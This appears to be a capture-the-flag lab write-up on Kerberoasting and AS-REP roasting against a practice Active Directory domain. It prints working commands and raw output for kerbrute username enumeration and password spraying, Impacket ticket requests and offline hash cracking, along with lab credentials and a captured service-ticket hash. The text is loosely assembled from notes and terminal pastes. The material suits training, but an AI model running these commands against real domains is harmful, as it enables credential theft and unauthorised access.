Kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name (“SPN”).

# How do Kerberoasting attacks work?
Kerberoasting attacks exploit a combination of weak encryption techniques and simple or low-complexity passwords. These attacks typically follow the below process:

1. A threat actor compromises the account of a Domain User.
2. The threat actor uses the Domain User context to  request a Kerberos service ticket from the ticket granting service (TGS) using tools like GhostPack’s Rubeus or SecureAuth Corporation’s GetUserSPNs.py.
username: Olivia
password: ichliebedich
3. The threat actor receives a ticket from the Kerberos key distribution center (KDC). The ticket is encrypted with a hashed version of the account’s password.
4. The threat actor captures the TGS ticket and takes it offline.
5. The threat actor attempts to crack the SPN credential hash to obtain the service account’s plaintext password using brute force techniques or tools like Hashcat or JohnTheRipper.
6. With the service account password in hand, the threat actor attempts to authenticate as  the service account and is granted access to any service, network or system associated with the compromised account.
7. The attacker is then able to steal data, escalate privileges or set backdoors on the network to ensure future access.

# A few things to keep in mind:
->Kerberoasting attacks do not require a Domain Admin account or an account that has elevated privileges. In fact, any Domain User account can be used in this attack type since any account can request service tickets from the TGS.
->Kerberoasting requires the adversary to have existing access to a user account in order to request tickets from the KDC. This access can be achieved from a variety of methods, such as social engineering, malware or even purchasing user credentials on the dark web.
->The SPN can be linked to either a host-based or domain user account. Host-based SPNs are not vulnerable to Kerberoasting attacks because the password is a long, complex key that is refreshed every 30 days or less. These complex, random passwords are difficult to crack even with advanced cracking tools and brute force techniques. User account SPN passwords, on the other hand, are selected by humans and therefore often subject to the same vulnerabilities of any other manually created passwords. This is to say that the SPN password may be considered weak, common, outdated, recycled or reused. Advanced tools can often crack these passwords in a matter of hours.
->Kerberoasting attacks also exploit an architecture flaw, in that any authenticated domain user can initiate a TGS request for any service on the network. The domain controller that is the recipient of the request typically does not check to see if the user is authorized to access this service. The service itself enforces access rights, which creates a loophole by which an offline attack can occur.

# Nmap sample scan result

    389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
    
    3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-04-18T

Let’s start enumerate the kerberos users and see if we can find something: this time lets use Kerbrute (https://github.com/ropnop/kerbrute)

You can find the list i used here: (https://github.com/insidetrust/statistically-likely-usernames)


    ./kerbrute_linux_amd64 userenum --dc <commonName> -d <domainName> -v /path/to/wordlist   | kerbrute.outdated

To filter for valid usernames
    
    cat kerbrute.out | grep '+' | awk '{print$7}' > usernames.txt


Now we have a list of valid Users but no passwords.

Let's try an ASRep Roasting attack, attempting to exploit the lack of pre-authentication for some accounts, we can try to intercept some hashes.

    cat usernames.txt | head

    GetNPUsers.py jab.htb -userfile usernames.txt -format hashcat -outputfile hashes_roast.txt

To get any pre-authenticated users with their hash

    cat hashes_roast.txt
    
Crach the hshes using hashcat

    hashcat hashes_roast.txt /path/to/wordlist --show
    
We have now a clear password for jmontgomery@jab.htb, and we can check if it works and has been reused: let’s spay the password for all the users

    ./kerbrute_linux_amd64 passwordspray --dc <commonName> -d <domainName> username.txt <password>


























kerbrute userenum --dc 10.10.11.42 --domain administrator.htb  john.txt 


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/13/24 - Ronnie Flathers @ropnop

2024/11/13 16:11:20 >  Using KDC(s):
2024/11/13 16:11:20 >   10.10.11.42:88

2024/11/13 16:11:21 >  [+] VALID USERNAME:   michael@administrator.htb
2024/11/13 16:11:24 >  [+] VALID USERNAME:   emily@administrator.htb
2024/11/13 16:11:38 >  [+] VALID USERNAME:   benjamin@administrator.htb
2024/11/13 16:11:43 >  [+] VALID USERNAME:   olivia@administrator.htb
2024/11/13 16:11:47 >  [+] VALID USERNAME:   ethan@administrator.htb
2024/11/13 16:21:38 >  Done! Tested 8477 usernames (5 valid) in 617.984 seconds
➜  statistically-likely-usernames git:(master) 





 python GetNPUsers.py administrator.htb/ -usersfile usernames.txt -format hashcat -outputfile hashes.asrep

Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User olivia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User benjamin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emily doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ethan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] invalid principal syntax
➜  examples git:(main) ✗ 



Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
just/whateverUn1Que   ethan            2024-10-12 23:52:14.117811  <never>  






ldapsearch -x -H ldap://10.10.11.42 -D "Olivia@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"



py getTGT.py administrator/Olivia:ichliebedich -dc-ip 10.10.11.42



python GetADUsers.py administrator.htb/olivia:ichliebedich -all

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying administrator.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-10-22 21:59:36.285281  2024-11-13 22:39:16.818161 
Guest                                                 <never>              <never>             
krbtgt                                                2024-10-04 22:53:28.687272  <never>             
olivia                                                2024-10-06 04:22:48.769574  2024-11-13 23:40:57.474433 
michael                                               2024-10-06 04:33:37.049043  <never>             
benjamin                                              2024-10-06 04:34:56.558374  2024-10-06 05:14:53.199541 
emily                                                 2024-10-31 02:40:02.775756  2024-11-13 23:19:40.177623 
ethan                                                 2024-10-12 23:52:14.117811  <never>             
alexander                                             2024-10-31 03:18:04.165508  <never>             
emma                                                  2024-10-31 03:18:35.259255  <never>             





➜  examples git:(main) ✗ sudo ntpdate 10.10.11.42           
14 Nov 01:38:26 ntpdate[556241]: step time server 10.10.11.42 offset +25199.885627 sec
➜  examples git:(main) ✗ python GetUserSPNs.py administrator.htb/olivia:ichliebedich -request

Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
just/whateverUn1Que   ethan            2024-10-12 23:52:14.117811  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3057649a933b0096c83abbc4a108f4cd$7fac44754a47c2e9733514afc4ca22e6783748979b9625a9f506866c91c1d9530bc935c533939bf7c15014172311a2c49d2991117281ab6e3f2b42e03999e1b4fecf6f23cfa80b591eda845b210a242b343e3db495007eeaf8e8090de74b9397b19cdd88d046ddf51849ce6af54b4a67ae6ffd675d12c6e07ea442a5bd95b0f18b8075cc6fe2d44d5583221aa94748a4ab8eb6cda4e1c827c515475b42904117f55d9014d93beb0bf2e29141f73fe9400272a3762376f286b26cbf06235245591fa98e510540bf1058bfabbe174b8cfebf237213f94e01e434ca14e03d22ce1d9eeee0b54861208340706a36ea563062f5327f63313148bcd3fc2257fc7f0b563d81d921c891c0e9409b16be5aef6cc527db8769d7f7fced9bad65bc67d91a0b4583351c86b9df27bef16dcf9da9e7de8dd754972c6678249811830eec04f6f83cbbb29c07baf78aa9a444e98fc9ba6858bfca2d20337fba8818b40b342204e754da9956314c96c9ed7ba731d2f5ba7e407b4472debef37e0abdca78bbc8768477d4d92ce9da270bbe8f6a14ef150369106b5d6e64bec5afd2bc96efa34d08576b15c73f584ea4f815db95924aea6f0841a46c5bf1af1f1245ee2bb88ea52df40983b52b0ca9fb2da8df36b002966be7e512d974577cc25f1ef972321ff317e1576e0ab443ac7cb8fc8f77b9e14ffc5af2eabdb56c4f405999ebb88ff4c62ed29d2cb9d8b064f76faa8aa4e7785225d105589e8a68e0621a1388cb77134c78958aadd83c36819e454f0038bc9fb963d38c5e89f96cfbeae2dbb9cf9eb71c8102bb66d1c1b83fd90d58a87dab82f96abbb06bdaa413b832bf650c27bf14b67b559633cb9e3fd6ca4fe027c8037f098e14ea25315344c0cae57e94b8f2aec85366faef5202c07506e4f7b8e2419d836fbaeec5d7fdafda4d2d645aeae28881a19d6940584e4b6eb44da61c780ad66601e5fdac32e8228b998edefebf8ccbb37e9ebbca740c81e9c7cd1ef7f335ace899753d834cf989519408ed5f5d9d6ec975833821e9db1e4176d8a7fd7b4f1a4fc941925fc17a1bad1af790f6b2dea69178557ffdb09212db3a87f937583960dcb6995e7f22514ad9b2abc8393706826742144688f1458e00232c25e764ff51f1923e3ff2a7946e0ed5a41dbdb965c60d37f99d66bd28f42266ac6f14be652d4ab83af4cd8d6cea8b6a4d385a2708263d4a11e73b9cc84d3a0b3fe5e3932a011ff96d51e33f4caafe374896eaf2b34a3c78fc01d323b08e95c858df4643b873e11775506872e67fadf158d194c8af23d16d4a59bb9353d5e903c9e1bf766a7a0a0cefd8c61df6e1a1d28d93adabd38ea4bd820e3065c8c3501f89f78f096bf45405b9d9062db5f99b043d1c98b8766c646efd60c91af1ecb7d4685f1c654adbf179bb39446ba977cc6145bb2dd57cfcfcdf3a51681660e35dfdb477e00b2effaedeb97504349cf37cda69af8251c106156d23af08fddfd4253dc814f8fb3b9ad6232dcd3b4b74d760295a
